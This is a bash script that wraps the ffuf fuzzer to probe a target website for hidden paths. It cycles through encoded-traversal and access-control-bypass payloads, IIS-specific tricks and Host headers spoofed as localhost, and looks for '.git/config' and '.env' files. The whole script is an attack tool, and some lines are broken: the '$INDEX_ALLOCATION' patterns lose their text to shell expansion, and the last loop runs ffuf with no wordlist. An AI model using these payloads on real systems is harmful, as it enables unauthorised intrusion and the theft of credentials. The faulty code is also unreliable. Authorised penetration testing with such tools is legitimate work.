#!/bin/bash

target=""
wordlist=""
while getopts "t:w:" opt; do
  case ${opt} in
    t ) target="$OPTARG" ;;
    w ) wordlist="$OPTARG" ;;
    * ) echo "Usage: $0 -t https://target.com -w wordlist.txt"; exit 1 ;;
  esac
done

if [ -z "$target" ] || [ -z "$wordlist" ]; then
  echo "Usage: $0 -t https://target.com -w wordlist.txt"
  exit 1
fi

EXTENSIONS=".asp,.aspx,.ashx,.ash,.jsp,.jspx,.php,.js,.dll,.json,.bak,.bkp,.conf,.txt,.py,.zip,.tar.gz,.tar,.7z,.old"

PATTERNS=(
    "FUZZ" "FUZZ/" "FUZZ.example" "FUZZ.sample" "FUZZ.template"
    "%3B/FUZZ/" "..%3B/FUZZ/" "FUZZ..%2f" "FUZZ%09" "FUZZ%23"
    "FUZZ..%00" "FUZZ;%09" "FUZZ;%09.." "FUZZ;%09..;" "FUZZ;%2f.."
    ".FUZZ" "%0AFUZZ" "%0D%0AFUZZ" "%0DFUZZ" "%2e/FUZZ/"
    "FUZZ%20" "FUZZ%2520" "%u002e%u002e/%u002e%u002e/FUZZ"
    "%2e%2e%2f/FUZZ/" "%2EFUZZ" "FUZZ.old" "FUZZ?.css" "FUZZ?.js"
    "_FUZZ" "FUZZ_" "_FUZZ_" "..;/FUZZ/" "..;/..;/FUZZ/" "../FUZZ"
    "-FUZZ" "~FUZZ" "FUZZ..;/" "FUZZ;/" "FUZZ#" "FUZZ/~"
    "!FUZZ" "#/FUZZ/" "-/FUZZ/" "FUZZ~" "FUZZ/.git/config"
    "FUZZ/.env" "FUZZ." "FUZZ/*" "FUZZ/?"
)

for pattern in "${PATTERNS[@]}"; do
    ffuf -u "$target/$pattern" -w "$wordlist"
done

for host in "127.0.0.1" "localhost"; do
    ffuf -u "$target/FUZZ" -H "Host: $host" -w "$wordlist"
done

ffuf -u "$target/FUZZ" -recursive -w "$wordlist"
ffuf -u "$target/FUZZ" -recursive -w "$wordlist" -e "$EXTENSIONS"

IIS_PATTERNS=(
    "(A(ABCD))/FUZZ" "(ABCD)/FUZZ" "(A(XXXXXXXX)F(YYYYYYYY))/FUZZ"
    "FUZZ/(S(X))/" "bin::$INDEX_ALLOCATION/FUZZ"
    "bin::$INDEX_ALLOCATION/FUZZ.dll"
    "bin::$INDEX_ALLOCATION/FUZZ -e $EXTENSIONS"
)
for pattern in "${IIS_PATTERNS[@]}"; do
    ffuf -u "$target/$pattern"
done
